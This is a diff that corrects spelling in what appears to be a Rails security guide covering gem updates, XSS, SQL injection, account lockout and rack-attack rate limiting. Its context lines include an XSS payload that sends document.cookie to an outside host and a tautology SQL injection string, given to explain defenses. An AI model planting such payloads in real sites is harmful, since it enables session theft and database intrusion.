@@ -52,12 +52,12 @@ users should as soon as possible update the software.
 In the real world it doesn't always happen, some gems can be abandoned without support, some people don't pay attention
 in security notes and rarely update the gems, other people even lock their gems versions and never update them.
 
-In my opinion the most important action to keep things secure is update your software frequently, also here enters a rule
+In my opinion the most important action to keep things secure is update your software often, also here enters a rule
 I like to follow, (**the most you have, the most you have to worry about**). Don't start putting any gem in your project
 indiscriminately. Each gem you use is a potential source of vulnerability. Also you should constantly search about bugs
 found in your gems.
 
-To automatize this process I recommend using the gem [bundler-audit](https://github.com/rubysec/bundler-audit)
+To automate this process I recommend using the gem [bundler-audit](https://github.com/rubysec/bundler-audit)
 
 ```ruby
 gem 'bundler-audit'
@@ -186,7 +186,7 @@ document.write("<img src='http://www.hacktest.com?c=" + document.cookie + "' sty
 This code will try to load an image pointing to an external site and appending the cookies content as a parameter, if your
 cookies are not set as httpOnly the user's session will be sent as a `c` parameter and will be logged in the server's log.
 
-So it is crucial to sanitize any user's input before rendering the html and fortunally using rails it is the default
+So it is crucial to sanitize any user's input before rendering the html and fortunately using rails it is the default
 behaviour, unless you use `raw` in the views.
 
 Another good feature you can use to avoid XSS is the response header `X-XSS-Protection`, setting `X-XSS-Protection=1` will
@@ -194,7 +194,7 @@ cause the browser try to detect and block some potential XSS attacks (the browse
 the attack).
 
 ## Be careful with SQL Injection
-SQL Injection has the same principe of other injection attacks, but instead of injecting code to be rendered in the frontend
+SQL Injection has the same principe of other injection attacks, but instead of injecting code to be rendered in the front-end
 sql injection attacks aim in the database, depending on how you have created your queries (if you simply concatenated strings
 with the user's inputed parameters) a hacker can inject some code and modify the original command.
 
@@ -215,7 +215,7 @@ SELECT * FROM "users" WHERE (email = 'email' and encrypted_password = '' or 1=1 
 
 This example above is very silly, in the real life an attacker would use a sql injection exploitation framework (the most famous
 is the [SQLMap](http://sqlmap.org)). This sql injection frameworks support several databases and automatizes all the attack
-life cicle like discovering tables, discovering system tables, dumping data and even trying to execute command line in the OS
+life cycle like discovering tables, discovering system tables, dumping data and even trying to execute command line in the OS
 directly.
 
 ## Lock users account after X failed sign in attempts
@@ -286,10 +286,10 @@ in this attack the aggressor tries to flood your application with requests causi
 because it is too busy responding the fake requests.
 
 The difference between DoS and DDoS is the distributed factor, a DDoS attack is harder (sometimes almost impossible) to defend
-yourself against due the attacker uses serveral clients to perform the attack.
+yourself against, due the attacker uses several clients to perform the attack.
 
 In rails you can try to mitigate this kind of attack using a gem called [rack-attack](https://github.com/kickstarter/rack-attack).
-Rack-attack is a middleware that allow you to define rules about accesses, you can for instance block IPs based on blacklists
+Rack-attack is a middleware that allow you to define rules about accesses, you can for instance block IPs based on black lists
 
 ```ruby
 Rack::Attack.blocklist('block 1.2.3.4') do |req|
@@ -298,7 +298,7 @@ Rack::Attack.blocklist('block 1.2.3.4') do |req|
 end
 ```
 
-Block based on User Agent (not so useful in my opnion due it is easy to fake).
+Block based on User Agent (not so useful in my opinion, because it is easy to fake).
 
 ```ruby
 # Block logins from a bad user agent
@@ -307,7 +307,7 @@ Rack::Attack.blocklist('block bad UA logins') do |req|
 end
 ```
 
-You can also allow block everyone and only allow based in a whitelist.
+You can also allow block everyone and only allow based in a white list.
 
 ```ruby
 # Always allow requests from localhost (blocklist & throttles are skipped)
